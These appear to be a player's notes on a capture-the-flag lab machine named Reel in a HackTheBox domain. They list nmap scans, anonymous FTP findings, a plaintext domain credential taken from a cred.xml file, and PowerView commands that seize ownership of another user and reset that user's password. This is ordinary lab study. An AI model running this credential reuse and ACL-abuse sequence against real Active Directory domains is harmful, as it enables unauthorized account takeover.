IP = 10.10.10.77

Nmap (nmap -p- -Pn 10.10.10.77)
```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
25/tcp open  smtp
```

Nmap2 (nmap -p 21,22,25 -sC -sV -Pn 10.10.10.77)
```bash
PORT   STATE SERVICE VERSION                                               
21/tcp open  ftp     Microsoft ftpd                                               
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                             
|_05-28-18  11:19PM       <DIR>          documents  
| ftp-syst:                             
|_  SYST: Windows_NT                            
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)                             
| ssh-hostkey:                            
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)        
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)         
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)           
25/tcp open  smtp?                           
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP    
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY       
| fingerprint-strings:                             
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck
, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     220 Mail Service ready 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready 
|     sequence of commands 
|     sequence of commands  
|   Hello:       
|     220 Mail Service ready 
|     EHLO Invalid domain address.
```

AppLocker.docx (ftom ftp):
![[Pasted image 20220224103624.png]]

Hostnames from windows-event...pdf
```
LAPTOP12.HTB.LOCAL
WEF.HTB.LOCAL
```

Credentials (from C:\Users\nico\Desktop\cred.xml)
```
HTB\Tom : 1ts-mag1c!!!
```

note
```
Findings:                                                                                                     

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                

Maybe we should re-run Cypher query against other groups we've created.    
```

Set-DomainObjectOwner -identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$cred = ConvertTo-SecureString "Burnbaby1!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred